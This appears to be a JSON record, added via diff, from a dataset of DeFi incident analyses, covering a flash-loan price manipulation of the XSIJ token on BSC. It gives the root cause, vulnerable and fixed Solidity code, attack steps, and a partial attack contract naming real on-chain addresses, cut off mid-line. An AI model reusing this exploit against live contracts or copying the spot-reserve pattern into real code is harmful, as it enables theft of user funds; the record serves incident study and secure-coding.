@@ -1,0 +1,36 @@
+{
+ "id": "2024__2024-01-18_XSIJ_FlashLoanPriceManipulation",
+ "source_file": "2024/2024-01-18_XSIJ_FlashLoanPriceManipulation.md",
+ "title": "XSIJ Token — Flash Loan-Based Strategic Token Transfer Price Manipulation Analysis",
+ "date": "2024-01-18",
+ "protocol": "XSIJ Token",
+ "chain": "BSC",
+ "loss_raw": "~$51,000",
+ "loss_usd": 51000.0,
+ "root_cause": "Transferring XSIJ tokens alters the pair's balance, allowing withdrawal at a favorable ratio based on manipulated reserves when `removePoolAmount()` is called",
+ "attack_tx": null,
+ "vulnerable_contract": "XSIJ 0x31bfA137",
+ "classes": [
+  "flash-loan"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: withdrawal ratio calculated from spot balance\nfunction removePoolAmount(uint256 amount) external {\n    // Withdrawal ratio based on current pair reserves — manipulable\n    (uint256 reserve0, uint256 reserve1,) = pair.getReserves();\n    uint256 ratio = reserve0 * 1e18 / reserve1;\n    uint256 outAmount = amount * ratio / 1e18;\n    BUSD.transfer(msg.sender, outAmount);\n}\n\n//",
+  "// File: XSIJ_decompiled.sol\ncontract XSIJ {\n    function removePoolAmount() external {}  // ❌ vulnerability"
+ ],
+ "code_after": [
+  "✅ Safe code: TWAP-based ratio + slippage limit\nfunction removePoolAmount(uint256 amount) external {\n    uint256 twapRatio = getTWAPRatio(1800); // 30-minute TWAP\n    uint256 currentRatio = getCurrentRatio();\n    require(\n        currentRatio * 100 / twapRatio <= 110, // allow within 10%\n        \"price manipulated\"\n    );\n    uint256 outAmount = amount * twapRatio / 1e18;\n    BUSD.transfer(msg.sender, outAmount);\n}"
+ ],
+ "steps": [
+  "→ [1] DODO flash: 100,000 BUSD flash loan",
+  "→ [2] BUSD → XSIJ swap (PancakeRouter)",
+  "→ [3] Maximize pair imbalance via repeated XSIJ transfers",
+  "→ [4] XSIJ → BUSD reverse swap (at manipulated price)",
+  "→ [5] Acquire excess BUSD (favorable exchange at manipulated ratio)",
+  "→ [6] Repay DODO 100,000 BUSD",
+  "→ [7] ~$51K profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] DODO flash: 100,000 BUSD flash loan\n  │\n  ├─→ [2] BUSD → XSIJ swap (PancakeRouter)\n  │         └─ Pair's XSIJ balance decreases, BUSD balance increases\n  │\n  ├─→ [3] Maximize pair imbalance via repeated XSIJ transfers\n  │\n  ├─→ [4] XSIJ → BUSD reverse swap (at manipulated price)\n  │\n  ├─→ [5] Acquire excess BUSD (favorable exchange at manipulated ratio)\n  │\n  ├─→ [6] Repay DODO 100,000 BUSD\n  │\n  └─→ [7] ~$51K profit",
+  "interface IXSIJ {\n    function removePoolAmount(uint256 amount) external;\n}\n\ncontract AttackContract {\n    IXSIJ   constant xsij = IXSIJ(0x31bfA137C76561ef848c2af9Ca301b60451CaAC0);\n    IERC20  constant BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IPancakePair constant pair = IPancakePair(0xf43Fd71f404CC450c470d42E3F478a6D38C96311);\n    IDODOPool constant dpp = IDODOPool(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);\n\n    function testExploit() external {\n        // [1] DODO flash loan 100,000 BUSD\n        dpp.flashLoan(100_000e18, 0, address(this), \"\");\n    }\n\n    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {\n        // [2] BUSD → XSIJ swap (create pair imbalance)\n        BUSD.approve(router, type(uint256).max);\n        swapBUSDToXSIJ(100_"
+ ]
+}
